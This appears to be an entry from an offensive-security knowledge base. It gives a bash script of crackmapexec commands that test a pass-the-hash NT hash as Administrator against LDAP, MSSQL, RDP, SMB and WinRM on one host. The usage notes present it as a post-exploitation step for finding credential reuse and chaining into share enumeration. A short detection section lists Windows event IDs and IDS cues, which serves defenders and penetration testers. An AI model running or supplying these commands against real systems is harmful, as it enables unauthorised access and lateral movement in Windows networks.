---
id: 3d5c0e14-7cf5-4f3a-a9c6-f5e3993fcaba
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:30.721449+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-testing
  - script
  - nt-hash
validated: true
---

# Multi-Protocol-Credential-Test-with-NT-Hash

## Code

```bash
crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
crackmapexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```

## Description

This bash script batch-tests an NT hash against LDAP, MSSQL, RDP, SMB, and WinRM protocols on a single target IP. It automates multi-protocol validation to quickly identify valid access paths in a Windows environment.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 192.168.1.100 | Target IP address | 10.0.0.50 |
| Administrator | Username to test | user@domain.com |
| :31d6cfe0d16ae931b73c59d7e0c089c0 | NT hash (colon-prefixed) | :aabbccddeeff00112233445566778899 |

## Usage

Save as a .sh file, make executable (chmod +x), and run in a terminal with CrackMapExec installed. Customize IP, username, and hash before execution. Use in post-exploitation to confirm credential reuse across services; chain with share enumeration on SMB success.

## Detection

- Monitor for multiple failed/successful auth events (Event IDs 4624/4625) across protocols from the same source IP.
- Network IDS signatures for CrackMapExec user-agent or Impacket traffic patterns.
- Kerberos/NTLM log anomalies in Windows Event Viewer or SIEM tools like Splunk.

## Related

- [[procedures/Test-Credentials-Against-Multiple-Protocols-with-CrackMapExec]]
- [[tools/CrackMapExec]]
